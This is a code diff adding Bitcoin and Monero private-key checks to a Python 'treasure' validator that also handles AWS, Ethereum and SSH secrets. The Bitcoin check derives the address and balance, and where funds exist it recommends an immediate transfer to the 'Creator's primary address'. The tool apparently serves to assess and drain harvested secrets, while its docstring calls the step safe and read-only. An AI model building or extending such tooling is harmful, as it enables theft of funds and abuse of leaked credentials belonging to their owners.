@@ -16,6 +16,7 @@ from typing import Dict, Any
 # Assuming web3 is installed and wallet.py is in the python path
 from web3 import Web3
 from web3.exceptions import InvalidAddress
+from core.crypto_utils import btc_private_key_to_address, get_btc_balance, is_valid_xmr_private_key
 
 def validate_treasure(treasure_type: str, value: Any, file_content: str = None) -> Dict[str, Any]:
     """
@@ -175,12 +176,71 @@ def _validate_ssh_private_key(key_content: str) -> Dict[str, Any]:
     }
 
 
+def _validate_btc_private_key(private_key: str) -> Dict[str, Any]:
+    """
+    Validates a Bitcoin private key by deriving its public address and checking the balance.
+    This is a safe, read-only operation.
+
+    Args:
+        private_key: The Bitcoin private key string (WIF format).
+
+    Returns:
+        A dictionary with validation results, including address and balance.
+    """
+    try:
+        address = btc_private_key_to_address(private_key)
+        balance_btc = get_btc_balance(address)
+
+        recommendations = []
+        if balance_btc > 0:
+            recommendations.append(f"IMMEDIATE ACTION: Funds detected! Recommend immediate transfer to Creator's primary address.")
+        else:
+            recommendations.append("Check transaction history for past activity.")
+            recommendations.append("Monitor this address for any future incoming transactions.")
+
+        return {
+            "validated": True,
+            "scope": {
+                "address": address,
+                "balance_btc": float(balance_btc)
+            },
+            "recommendations": recommendations
+        }
+    except Exception as e:
+        return {"validated": False, "error": f"Invalid Bitcoin private key or network error: {str(e)}"}
+
+def _validate_xmr_private_key(private_key: str) -> Dict[str, Any]:
+    """
+    Validates a Monero private key by checking its format.
+
+    Args:
+        private_key: The Monero private key string (hex format).
+
+    Returns:
+        A dictionary with validation results.
+    """
+    try:
+        if is_valid_xmr_private_key(private_key):
+            return {
+                "validated": True,
+                "scope": {
+                    "key_type": "Monero Private Key",
+                },
+                "recommendations": ["Monero address and balance cannot be determined from the private key alone due to Monero's privacy features. Further analysis is required."]
+            }
+        else:
+            return {"validated": False, "error": "Invalid Monero private key format."}
+    except Exception as e:
+        return {"validated": False, "error": f"An unexpected error occurred: {str(e)}"}
+
 # --- Validator Dispatch Table ---
 # This table maps treasure types to their respective validation functions.
 VALIDATORS = {
     "aws_api_key": _validate_aws_api_key,
     "eth_private_key": _validate_eth_private_key,
     "ssh_private_key": _validate_ssh_private_key,
+    "btc_private_key": _validate_btc_private_key,
+    "xmr_private_key": _validate_xmr_private_key,
     # Future validators for other key types will be added here.
     # "gcp_api_key": _validate_gcp_api_key,
 }
